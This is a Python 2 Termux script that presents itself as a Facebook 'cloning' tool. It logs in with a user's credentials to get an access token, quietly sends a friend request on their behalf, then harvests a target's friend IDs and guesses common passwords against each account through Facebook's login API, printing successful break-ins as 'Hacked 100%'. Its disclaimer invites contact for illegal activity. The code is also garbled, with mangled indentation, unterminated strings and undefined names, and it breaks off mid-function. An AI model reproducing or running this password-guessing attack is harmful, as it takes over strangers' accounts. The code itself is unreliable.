#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To ALEX SHOHAN
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2022
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(5000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 SHOHAN')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def keluar():
	print 'Subscribe To Termux Tutorial'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:Alex Shohan
##### LOGO #####
logo = """
\033[1;91m▄████▄   ██▀███   ▄▄▄      ▒███████▒▓██   ██▓         
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒         
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░         
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░         
\033[1;92m▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒███████▒  ░ ██▒▓░         
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒          
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░          
░          ░░   ░   ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░           
░ ░         ░           ░  ░  ░ ░     ░ ░              
░                           ░         ░ ░              
\033[1;96m██████  ██░ ██  ▒█████   ██░ ██  ▄▄▄       ███▄    █ 
▒██    ▒ ▓██░ ██▒▒██▒  ██▒▓██░ ██▒▒████▄     ██ ▀█   █ 
░ ▓██▄   ▒██▀▀██░▒██░  ██▒▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒
  ▒   ██▒░▓█ ░██ ▒██   ██░░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
\033[1;93m██████▒▒░▓█▒░██▓░ ████▓▒░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░  ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░  ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░
░  ░  ░   ░  ░░ ░░ ░ ░ ▒   ░  ░░ ░  ░   ▒      ░   ░ ░ 
      ░   ░  ░  ░    ░ ░   ░  ░  ░      ░  ░         ░ 
                                                       
\033[1;93m\033[1;92m\033[1;93m Telegram Number \033[1;94m\033[1;95m\033[1;93m  \033[1;96m\033[1;93m +8801406876761 \033[1;92m\033[1;95m
\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"""

                                                                                                              \033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"""
logo2 = """
\033[1;95m
░██████╗░░█████╗░░█████╗░██████╗░
██╔════╝░██╔══██╗██╔══██╗██╔══██╗
██║░░██╗░██║░░██║██║░░██║██║░░██║
██║░░╚██╗██║░░██║██║░░██║██║░░██║
╚██████╔╝╚█████╔╝╚█████╔╝██████╔╝
░╚═════╝░░╚════╝░░╚════╝░╚═════╝░
██████╗░██╗░░░██╗███████╗
██╔══██╗╚██╗░██╔╝██╔════╝
██████╦╝░╚████╔╝░█████╗░░
██╔══██╗░░╚██╔╝░░██╔══╝░░
██████╦╝░░░██║░░░███████╗
╚═════╝░░░░╚═╝░░░╚══════╝
logo3 = """
\033[1;94m
██╗███╗░░██╗██████╗░██╗░█████╗░
██║████╗░██║██╔══██╗██║██╔══██╗
██║██╔██╗██║██║░░██║██║███████║
██║██║╚████║██║░░██║██║██╔══██║
██║██║░╚███║██████╔╝██║██║░░██║
╚═╝╚═╝░░╚══╝╚═════╝░╚═╝╚═╝░░╚═╝
\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mWhite-Tiger-Komail\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m▄████▄   ██▀███   ▄▄▄      ▒███████▒▓██   ██▓         
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒         
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░         
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░         
\033[1;92m▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒███████▒  ░ ██▒▓░         
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒          
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░          
░          ░░   ░   ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░           
░ ░         ░           ░  ░  ░ ░     ░ ░              
░                           ░         ░ ░              
\033[1;96m██████  ██░ ██  ▒█████   ██░ ██  ▄▄▄       ███▄    █ 
▒██    ▒ ▓██░ ██▒▒██▒  ██▒▓██░ ██▒▒████▄     ██ ▀█   █ 
░ ▓██▄   ▒██▀▀██░▒██░  ██▒▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒
  ▒   ██▒░▓█ ░██ ▒██   ██░░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
\033[1;93m██████▒▒░▓█▒░██▓░ ████▓▒░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░  ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░  ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░
░  ░  ░   ░  ░░ ░░ ░ ░ ▒   ░  ░░ ░  ░   ▒      ░   ░ ░ 
      ░   ░  ░  ░    ░ ░   ░  ░  ░      ░  ░         ░ 
   \033[1;97m✮❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂✮"""
jalan("\033[1;96m  _____                                    __           
   |     \                                  |  \          
    \$$$$$  ______    _______  ______ ____   \$$ _______  
      | $$ /      \  /       \|      \    \ |  \|       \ 
 __   | $$|  $$$$$$\|  $$$$$$$| $$$$$$\$$$$\| $$| $$$$$$$\
|  \  | $$| $$    $$ \$$    \ | $$ | $$ | $$| $$| $$  | $$
| $$__| $$| $$$$$$$$ _\$$$$$$\| $$ | $$ | $$| $$| $$  | $$
 \$$    $$ \$$     \|       $$| $$ | $$ | $$| $$| $$  | $$
  \$$$$$$   \$$$$$$$ \$$$$$$$  \$$  \$$  \$$ \$$ \$$   \$$
                                                          
                                                                                                                                                                                                          
jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
jalan("\033[1;93m▇▇\033[1;95m           Owner:  Alex Shohan     \033[1;93m▇▇")
jalan("\033[1;93m▇▇\033[1;91m             Facebook:  S　H　O　H　A　 N　ツ    \033[1;93m▇▇")
jalan("\033[1;93m▇▇\033[1;92m            Tool Update Everyday      \033[1;93m▇▇")
jalan("\033[1;93m▇▇\033[1;92m        Youtube:Termux Tutorial    \033[1;93m▇▇")
jalan("\033[1;93m▇▇\033[1;92m           Telegram: +8801406876761    \033[1;93m▇▇")
jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
print "\033[1;97m✮❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂✮"                                                   
 CorrectUsername = "Shohan"
CorrectPassword = "Jesmin"
    
                                                                                                    loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Alex Shohan
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://youtu.be/K2RLfE8Gf1U?sub_confirmation=1')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://youtu.be/K2RLfE8Gf1U?sub_confirmation=1')
        
        ##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo11
        print "\033[1;95m«-----------------\033[1;91mDisclaimer\033[1;95m---------------»"
        time.sleep(0.05)
        print "\033[1;43m       \033[1;34mThis Tool is Not for Educational Purpose   \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mThis presentation is for Shohan The shit off        \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mpurposes ONLY.How you use this information    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mis your responsibility.I will  be  100%       \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mheld accountable. This Tool/Channel Doesn't    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mSupport illegal activities.For any illegal    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mActivities Contact me Via Telegrame +8801406876761.\033[1;0m"
        time.sleep(0.05)
        print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;96m Fast Cloning Without Fb ID\033[1;92m[New Update]"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m2.\x1b[1;94m Alex Shohan 2nd youtube chennel   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m3.\x1b[1;91m Alex Shohan Youtibe Chennel   "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Exit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
        elif peak =="1":
		FreakedDudex()
        elif peak =="2":
		os.system('xdg-open https://youtube.com/channel/UCA7KxIYGu5d-UpVDtl8h1kA')
	        login()
        elif peak =="3":
	        os.system('xdg-open https://youtube.com/channel/UCELUcwsMUQrgKKvlO_WvVcw?sub_confirmation=1')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo13
		jalan(' \033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account' )
		jalan(' \033[1;91mWarning  \033[1;92mUse a New Account To Login' )
		jalan(' \033[1;91mWarning  \033[1;92mTermux All Version Work ' )                 
		print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"
		print('\033[1;97m\x1b[1;92m..............LOGIN WITH FACEBOOK.............\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mNO INTERNET CONNECTION"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.•◈•..'
				os.system('xdg-open https://youtube.com/channel/UCELUcwsMUQrgKKvlO_WvVcw?sub_confirmation=1')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
			def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mNO INTERNET CONNECTION"
		keluar()
	os.system("clear") #Dev:Shohan
        time.sleep(0.05)
	print logo2
	print "\033[1;94m    «-------\033[1;96mLogged in User Info\033[1;93m----------»"
        time.sleep(0.05)
	print "	   \033[1;93m «----Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
        time.sleep(0.05)
	print "	   \033[1;93m «----ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
        time.sleep(0.05)
	print "\033[1;95m«~~~~~~~~~~~~~~~~~\033[1;91m¶Disclaimer¶\033[1;95m~~~~~~~~~~~~~~~~~»"
        time.sleep(0.05)
        print "\033[1;43m       \033[1;34mThis Tool is for Educational Purpose   \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mThis presentation is not for educational          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mpurposes ONLY.How you use this information    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mis your responsibility.I will be  100%         \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mheld accountable. This Tool/Channel Doesn't    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mSupport illegal activities. For any illegal    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mActivitie Contact me Via WhatsApp \033[1;0m"
        time.sleep(0.05)
        print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;96m\033[1;92m Start    Cloning FreakedDude     "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;96m\033[1;91m Start    Target  Hacking        "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\033[1;96m\033[1;93m Facebook Report  FreakedDude      "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\033[1;96m\033[1;95m Friend's User    information      "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\033[1;96m\033[1;96m ID Not   Found   Problem solved  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;96m\033[1;91m Alex Shohan  All Commands  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;96m\033[1;94m Alex Shohan Telegrame   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;96m\033[1;93m Alex Shohan   Youtube Channel   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m9 .\033[1;96m\033[1;92m Login    Using   Token          "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m10.\033[1;96m\033[1;91m Show     Token   login/ID       "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\033[1;96m\033[1;96m Tool     Reset &  Update         "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m0 .\033[1;91m\033[1;91m logout                         "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose Option>>> \033[1;93m")
	if unikers =="":
		print "\x1b[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		crack()
        elif unikers =="2":
		os.system('clear')
		print logo
		brute()
        elif unikers =="3":
		freak()
        elif unikers =="4":
		dude()
        elif unikers =="5":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
        elif unikers =="6":
		os.system('clear')
		print logo10
		print "\033[1;95m«-----------------\033[1;91mMessage\033[1;95m---------------»"
                jalan('\033[1;92m............Massage..........')
		jalan('\033[1;95mID Not Found Problem Salution Menu 5 Num Option')
                jalan("\033[1;96mTermux  Data Clear Every Day")
                jalan('\033[1;96mCommand Complet  98% ')
                jalan('\033[1;96mCommand Update Every day')
                jalan("\033[1;93m.......All..Command...........")
                jalan('\033[1;91🔊⭕No1⭕🔊')
                jalan('\033[1;96mapt update')
                jalan('\033[1;96mapt upgrade')
                jalan('\033[1;96mpkg install python')
                jalan('\033[1;96mpkg install python2')
                jalan('\033[1;96mpkg install git')
                jalan('\033[1;96mpip2 install requests')
                jalan('\033[1;96mpip2 install mechanize') 
                jalan("\033[1;96mhttps://github.com/Alex-Shohan/Indiaa")
                jalan('\033[1;96mcd Indiaa')
                jalan('\033[1;96mpython2 Indiaa')
                jalan('\033[1;96mUser:Shohan')
                jalan('\033[1;96mpass:Jesmin')
                jalan('\033[1;92m👆Copy Command & send 2 groups👆')
                jalan('\033[1;91mYoutube Channel Like & Subscribe plz')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
        elif unikers =="7":
		os.system('xdg-open https://youtube.com/channel/UCELUcwsMUQrgKKvlO_WvVcw')
	        menu()
        elif unikers =="8":
	        os.system('xdg-open https://youtube.com/channel/UCELUcwsMUQrgKKvlO_WvVcw?sub_confirmation=1')
	        menu()
        elif unikers =="9":
		tokenz()
        elif unikers =="10":
		os.system('reset')
		print logo14
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;95mYour token\033[1;91m :\033[1;96m "+toket
		raw_input("\n\033[1;91m[ \033[1;93mBack \033[1;91m]")
		menu()
	elif unikers =="11":
		os.system('clear')
		print logo6
		print "\033[1;95m«-----------------\033[1;91mDataReset\033[1;95m---------------»"
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
                print logo22
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo4
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;95m Start Cloning India          "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m10.\033[1;95m Start Cloning Testing        "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\x1b[1;95m Start Cloning Group *Not Specified Yet*"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0 .\033[1;91m Back"
	pilih_crack()
	
	def pilih_crack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
		jjt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"
		try:
			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
			td = json.loads(m.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			crack()
		print"\033[1;93mGetting IDs\033[1;93m..."
		n = requests.get("https://graph.facebook.com/"+jjt+"/friends?access_token="+toket)
		d = json.loads(n.text)
		for c in d['data']:
			id.append(c['id'])
        elif peak =="2":
	        super()
        elif peak =="3":
	        hack()
        elif peak =="4":
	        freak()
        elif peak =="5":
	        dude()
        elif peak =="6":
	        test()
        elif peak =="7":
	        phone()
        elif peak =="8":
	        mail()
        elif peak =="9":
	        isi()
        elif peak =="10":
	        army()
        elif peak =="11":
                clone_dari_member_group ()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	
	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning India ')
	print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mAlex Shohan[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮"
	
	def main(arg):
		global cekpoint,sucessful
		user = arg
		try:
			os.mkdir('cookie')
		except OSError:
			pass #Dev:Alex Shohan
		try:
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'sunny leon'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mHacked 100%💉\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;91m24Hours\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
